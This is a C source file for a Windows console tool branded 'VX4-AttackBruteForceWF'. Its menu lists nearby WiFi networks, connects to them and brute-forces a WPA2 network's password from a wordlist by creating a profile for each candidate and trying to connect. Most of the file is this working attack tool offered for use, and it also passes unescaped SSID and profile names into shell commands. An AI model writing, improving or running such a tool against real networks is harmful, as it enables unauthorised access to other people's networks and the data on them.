#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <time.h>
#include <errno.h>

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

typedef struct {
    HANDLE hClient;
    PWLAN_INTERFACE_INFO_LIST pIfInfo;
    GUID InterfaceGuid;
} WLAN_CLIENT_CONTEXT;

const char* getErrorWLAN(WLAN_REASON_CODE reason) {
    switch(reason) {
        case WLAN_REASON_CODE_SUCCESS: return "Successful";
        case 0x00050007: return "Unsupported key format";     // WLAN_REASON_CODE_MSMSECURITY_KEYFORMAT_NOT_SUPPORTED
        case 0x00050001: return "Security disabled";        // WLAN_REASON_CODE_SECURITY_DISABLED
        case 0x00050011: return "Only personal safety";       // WLAN_REASON_CODE_SECURITY_PERSONAL_ONLY
        default: return "Unknown error";
    }
}

void escapeXML(const char* input, char* output, int maxLen) {
    int pos = 0;
    for (int i = 0; input[i] && pos < maxLen - 6; i++) {
        unsigned char c = (unsigned char)input[i];
        
        if (c == '&') {
            pos += snprintf(output + pos, maxLen - pos, "&amp;");
        } else if (c == '<') {
            pos += snprintf(output + pos, maxLen - pos, "&lt;");
        } else if (c == '>') {
            pos += snprintf(output + pos, maxLen - pos, "&gt;");
        } else if (c == '"') {
            pos += snprintf(output + pos, maxLen - pos, "&quot;");
        } else if (c == '\'') {
            pos += snprintf(output + pos, maxLen - pos, "&apos;");
        } else if (c < 32 || c > 126) {
            pos += snprintf(output + pos, maxLen - pos, "&#%d;", c);
        } else {
            output[pos++] = input[i];
        }
    }
    output[pos] = '\0';
}

int validatePassword(const char* password) {
    int len = strlen(password);
    if (len < 8 || len > 63) {
        printf("[!] The password must be between 8 and 63 characters long\n");
        return 0;
    }
    return 1;
}

int validateSSID(const char* ssid) {
    int len = strlen(ssid);
    if (len < 1 || len > 32) {
        printf("[!] The SSID must be between 1 and 32 characters long\n");
        return 0;
    }
    return 1;
}

DWORD WINAPI showNetworks(LPVOID lpParam) {
    int counter = 0;
    while (1)
    {
        if (counter > 0) printf("\n");
        printf("[*] Listing available networks...\n");
        printf("==============================================================\n");
        system("powershell -Command \"netsh wlan show networks mode=bssid\"");
        printf("==============================================================\n");
        printf("[*] Next update in 5 seconds...\n");
        Sleep(5000);
        counter++;
    }
    return 0;
}

int initWLANClient(WLAN_CLIENT_CONTEXT *context) {
    DWORD dwCurVersion = 0;

    printf("[*] Opening WLAN client...\n");
    if (WlanOpenHandle(2, NULL, &dwCurVersion, &context->hClient) != ERROR_SUCCESS) {
        printf("[!] ERROR: The WLAN client could not be opened\n");
        printf("[!] Make sure to run as administrator\n");
        return 0;
    }

    printf("[+] Open WLAN client (version: %lu)\n", dwCurVersion);

    printf("[*] Listing WiFi interfaces...\n");
    if (WlanEnumInterfaces(context->hClient, NULL, &context->pIfInfo) != ERROR_SUCCESS) {
        printf("[!] ERROR: Interfaces could not be enumerated\n");
        WlanCloseHandle(context->hClient, NULL);
        return 0;
    }

    if (context->pIfInfo->dwNumberOfItems == 0) {
        printf("[!] ERROR: No WiFi adapters available\n");
        WlanFreeMemory(context->pIfInfo);
        WlanCloseHandle(context->hClient, NULL);
        return 0;
    }

    printf("[+] %lu WiFi adapters were found\n", context->pIfInfo->dwNumberOfItems);
    context->InterfaceGuid = context->pIfInfo->InterfaceInfo[0].InterfaceGuid;
    printf("[+] Using adapter: %S\n", context->pIfInfo->InterfaceInfo[0].strInterfaceDescription);

    return 1;
}

void cleanupWLANClient(WLAN_CLIENT_CONTEXT *context) {
    if (context->pIfInfo) {
        WlanFreeMemory(context->pIfInfo);
        context->pIfInfo = NULL;
    }
    if (context->hClient) {
        WlanCloseHandle(context->hClient, NULL);
        context->hClient = NULL;
    }
}

int connectWiFiNetsh(const char* ssid, const char* password) {
    char comando[512];
    int resultado;
    
    snprintf(comando, sizeof(comando),
        "netsh wlan connect name=\"%s\" ssid=\"%s\" interface=\"*\"",
        ssid, ssid);
    
    char addProfile[1024];
    snprintf(addProfile, sizeof(addProfile),
        "netsh wlan add profile filename=\"profile.xml\" interface=\"*\"");
    
    FILE *xmlFile = fopen("profile.xml", "w");
    if (xmlFile == NULL) {
        return 0;
    }
    
    fprintf(xmlFile,
        "<?xml version=\"1.0\"?>"
        "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
        "<n>%s</n>"
        "<SSIDConfig><SSID><n>%s</n></SSID></SSIDConfig>"
        "<connectionType>ESS</connectionType>"
        "<connectionMode>auto</connectionMode>"
        "<MSM><security><authEncryption>"
        "<authentication>WPA2PSK</authentication>"
        "<encryption>CCMP</encryption>"
        "<useOneX>false</useOneX>"
        "</authEncryption><sharedKey>"
        "<keyType>passPhrase</keyType>"
        "<protected>false</protected>"
        "<keyMaterial>%s</keyMaterial>"
        "</sharedKey></security></MSM>"
        "</WLANProfile>", ssid, ssid, password);
    
    fclose(xmlFile);
    
    resultado = system(addProfile);
    
    Sleep(500);
    snprintf(comando, sizeof(comando),
        "netsh wlan connect name=\"%s\" ssid=\"%s\"", ssid, ssid);
    resultado = system(comando);
    
    Sleep(2000);
    
    remove("profile.xml");
    
    return (resultado == 0) ? 1 : 0;
}

int connectWiFi(const char* ssid, const char* password) {
    printf("\n[*] Initiating connection to: %s\n", ssid);

    if (!validateSSID(ssid)) return 0;
    if (!validatePassword(password)) return 0;

    char ssidEscaped[256];
    char passwordEscaped[256];
    escapeXML(ssid, ssidEscaped, sizeof(ssidEscaped));
    escapeXML(password, passwordEscaped, sizeof(passwordEscaped));

    WLAN_CLIENT_CONTEXT context = {0};
    if (!initWLANClient(&context)) {
        return 0;
    }

    char profileXml[2048];
    int xmlLen = snprintf(profileXml, sizeof(profileXml),
        "<?xml version=\"1.0\"?>"
        "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">"
        "<name>%s</name>"
        "<SSIDConfig>"
        "<SSID><name>%s</name></SSID>"
        "</SSIDConfig>"
        "<connectionType>ESS</connectionType>"
        "<connectionMode>auto</connectionMode>"
        "<autoSwitch>false</autoSwitch>"
        "<MSM>"
        "<security>"
        "<authEncryption>"
        "<authentication>WPA2PSK</authentication>"
        "<encryption>CCMP</encryption>"
        "<useOneX>false</useOneX>"
        "</authEncryption>"
        "<sharedKey>"
        "<keyType>passPhrase</keyType>"
        "<protected>false</protected>"
        "<keyMaterial>%s</keyMaterial>"
        "</sharedKey>"
        "</security>"
        "</MSM>"
        "</WLANProfile>", ssidEscaped, ssidEscaped, passwordEscaped);

    if (xmlLen < 0 || xmlLen >= (int)sizeof(profileXml)) {
        cleanupWLANClient(&context);
        return connectWiFiNetsh(ssid, password);
    }

    int len = MultiByteToWideChar(CP_UTF8, 0, profileXml, -1, NULL, 0);
    if (len == 0) {
        cleanupWLANClient(&context);
        return connectWiFiNetsh(ssid, password);
    }

    LPWSTR pwszProfile = (LPWSTR)malloc(len * sizeof(WCHAR));
    if (!pwszProfile) {
        cleanupWLANClient(&context);
        return connectWiFiNetsh(ssid, password);
    }

    if (!MultiByteToWideChar(CP_UTF8, 0, profileXml, -1, pwszProfile, len)) {
        free(pwszProfile);
        cleanupWLANClient(&context);
        return connectWiFiNetsh(ssid, password);
    }

    WLAN_REASON_CODE reason = 0;
    DWORD dwResult = WlanSetProfile(context.hClient, &context.InterfaceGuid, WLAN_PROFILE_USER,
        pwszProfile, NULL, TRUE, NULL, &reason);
    
    if (dwResult != ERROR_SUCCESS) {
        free(pwszProfile);
        cleanupWLANClient(&context);

        return connectWiFiNetsh(ssid, password);
    }

    DWORD dwConnect = WlanConnect(context.hClient, &context.InterfaceGuid, NULL, NULL);
    if (dwConnect != ERROR_SUCCESS) {
        free(pwszProfile);
        cleanupWLANClient(&context);
        return connectWiFiNetsh(ssid, password);
    }

    free(pwszProfile);
    cleanupWLANClient(&context);

    Sleep(2000);
    return 1;
}

int validateConnection(const char* ssid) {
    char command[512];
    char buffer[256];
    FILE *fp;

    snprintf(command, sizeof(command), "netsh wlan show interfaces | findstr \"SSID\" | findstr \"%s\"", ssid);

    fp = popen(command, "r");;
    if (fp == NULL) {
        printf("[!] ERROR: Could not validate connection\n");
        return 0;
    }

    int found = 0;
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (strstr(buffer, ssid) > 0) {
            found = 1;
            break;
        }
    }

    pclose(fp);
    return found;
}

void bruteForce() {
    FILE *file;
    char route[512];
    char ssid[256];
    char password[256];
    int attempts = 0;
    int found = 0;

    printf("\n");
    printf("╔════════════════════════════════════╗\n");
    printf("║      WiFi BruteForce Attack        ║\n");
    printf("╚════════════════════════════════════╝\n");
    printf("\n");

    printf("\nEnter the path to the password list (e.g., C:\\wordlist.txt): ");
    fflush(stdout);

    if (fgets(route, sizeof(route), stdin) == NULL) {
        printf("[!] ERROR: Failed to read file path\n");
        fflush(stdout);
        printf("\nPress Enter to continue...");
        getchar();
        return;
    }

    route[strcspn(route, "\n")] = 0;

    if (strlen(route) == 0) {
        printf("[!] ERROR: File path cannot be empty\n");
        fflush(stdout);
        printf("\nPress Enter to continue...\n");
        getchar();
        return;
    }

    printf("[*] Trying to open the file: %s\n", route);
    fflush(stdout);

    file = fopen(route, "r");
    if (file == NULL) {
        printf("[!] ERROR: Could not open the file: %s\n", route);
        printf("[!] Error code: %d\n", errno);
        printf("[!] Make sure:\n");
        printf("    - The path is correct\n");
        printf("    - The file exists\n");
        printf("    - You have read permissions\n");
        printf("    - Use backslashes correctly: C:\\Users\\...\n");
        fflush(stdout);
        printf("\nPress Enter to continue...\n");
        getchar();
        return;
    }

    printf("[+] File opened successfully\n");
    fflush(stdout);

    printf("\nEnter the network name (SSID): ");
    fflush(stdout);

    if (fgets(ssid, sizeof(ssid), stdin) == NULL) {
        printf("[!] ERROR: Failed to read SSID\n");
        fclose(file);
        fflush(stdout);
        printf("\nPress Enter to continue...\n");
        getchar();
        return;
    }
    ssid[strcspn(ssid, "\n")] = 0;

    if (strlen(ssid) == 0) {
        printf("[!] SSID cannot be empty\n");
        fclose(file);
        fflush(stdout);
        printf("\nPress Enter to continue...\n");
        getchar();
        return;
    }

    if (!validateSSID(ssid)) {
        fclose(file);
        fflush(stdout);
        printf("\nPress Enter to continue...\n");
        getchar();
        return;
    }

    printf("[+] Target SSID: %s\n", ssid);
    printf("[*] Starting brute force attack...\n");
    printf("==============================================================\n");
    fflush(stdout);

    while (fscanf(file, "%255s", password) == 1) {
        attempts++;

        if (!validatePassword(password)) {
            printf("[%5d] Skipping invalid password: %s\n", attempts, password);
            continue;
        }

        printf("\n[%5d] Trying password: %s\n", attempts, password);
        fflush(stdout);

        if (connectWiFi(ssid, password)) {
            Sleep(1500);

            if (validateConnection(ssid)) {
                printf("\n\n");
                printf("╔════════════════════════════════════╗\n");
                printf("║     ✓ PASSWORD FOUND!  ✓           ║\n");
                printf("╚════════════════════════════════════╝\n");
                printf("\n[+] SSID: %s\n", ssid);
                printf("[+] Password: %s\n", password);
                printf("[+] Total attempts: %d\n", attempts);
                printf("[+] Connected successfully!\n");
                found = 1;
                break;
            } else {
                printf("[x] Failed\n");
            }
        } else {
            printf("[x] Failed\n");
        }
        Sleep(500);
    }

    fclose(file);

    printf("\n");
    printf("==============================================================\n");
    if (!found) {
        printf("[!] Password not found in the list\n");
        printf("[!] Total passwords tried: %d\n", attempts);
    }
    printf("==============================================================\n");
    fflush(stdout);
    printf("\nPress Enter to continue...\n");
    getchar();
}

void listSavedNetworks() {
    printf("\n[*] Networks saved in the system:\n");
    printf("==============================================================\n");
    system("netsh wlan show profiles");
    printf("==============================================================\n");
}

void deletePerfil() {
    char namePerfil[256];
    printf("\n[*] Enter the name of the WiFi profile to delete: ");

    if (fgets(namePerfil, sizeof(namePerfil), stdin) == NULL) {
        printf("[!] ERROR: Failed to read profile name\n");
        return;
    }

    namePerfil[strcspn(namePerfil, "\n")] = 0;

    if (strlen(namePerfil) > 0) {
        char command[512];
        snprintf(command, sizeof(command), "netsh wlan delete profile name=\"%s\"", namePerfil);
        printf("\n[*] Deleting profile: %s\n", namePerfil);
        system(command);
    } else {
        printf("[!] Empty profile name\n");
    }
}

void captureHandshakes() {}

void analyzeTrafficOrKeys() {}

void generatePasswords() {}

void showMenu() {
    printf("\n");
    printf("     ██████╗██████╗ ██████╗         \n");
    printf("    ██╔════╝██╔══██╗██╔═══██╗       \n");
    printf("    ██║     ██║  ██║██║   ██║       \n");
    printf("    ██║     ██║  ██║██║▄▄ ██║       \n");
    printf("    ██║     ██║  ██║██║▀▀ ██║       \n");
    printf("    ╚██████╗██████╔╝╚██████╔╝       \n");
    printf("     ╚═════╝╚═════╝  ╚═════╝        \n\n");
    printf(" [ CDQ ] :: VX4-AttackBruteForceWF  \n");
    printf(" --------------------------------   \n");

    printf("\n[1] List available WiFi networks\n");
    printf("[2] Connect to a network\n");
    printf("[3] Connecting to a network by brute force\n");
    printf("[4] View saved networks\n");
    printf("[5] Delete WiFi profile\n");
    printf("[6] Capture WiFi handshakes (soon)\n");
    printf("[7] Analyze network traffic or keys (soon)\n");
    printf("[8] Generate password list (soon)\n");
    printf("[0] Exit\n");
    printf("\nSelect an option: ");
}
int main() {
    #ifdef _WIN32
    SetConsoleOutputCP(65001);
    #endif

    int option;
    int continues = 1;

    while(continues) {
        showMenu();
        scanf("%d", &option);
        getchar();

        switch (option)
        {
            case 1:
                    HANDLE hThread = CreateThread(NULL, 0, showNetworks, NULL, 0, NULL);
                    if (hThread == NULL) {
                        printf("[!] Error");
                        return 1;
                    }
                    printf("\n[*] Listing WiFi networks (press Ctrl+C to stop)...\n");
                    WaitForSingleObject(hThread, INFINITE);
                    CloseHandle(hThread);
                break;
            case 2:
                char ssid[256];
                char password[256];
                
                printf("\nEnter the network name (SSID): ");
                if (fgets(ssid, sizeof(ssid), stdin) == NULL) {
                    printf("[!] ERROR: Failed to read SSID\n");
                    break;
                }
                ssid[strcspn(ssid, "\n")] = 0;
                
                printf("Enter the password: ");
                if (fgets(password, sizeof(password), stdin) == NULL) {
                    printf("[!] ERROR: Failed to read password\n");
                    break;
                }
                password[strcspn(password, "\n")] = 0;
                
                if (strlen(ssid) > 0 && strlen(password) > 0) {
                    connectWiFi(ssid, password);
                } else {
                    printf("[!] Empty SSID or password\n");
                }
                break;
            case 3:
                bruteForce();
                break;
            case 4:
                listSavedNetworks();
                break;
            case 5:
                deletePerfil();
                break;
            case 6:
                captureHandshakes();
                break;
            case 7:
                analyzeTrafficOrKeys();
                break;
            case 8:
                generatePasswords();
                break;
            case 9:
                break;
            case 10:
                break;
            case 0:
                printf("[*] leaving...\n");
                continues = 0;
                break;
            default:
            printf("[!] Invalid option\n");
                break;
        }
    }

    return 0;
}
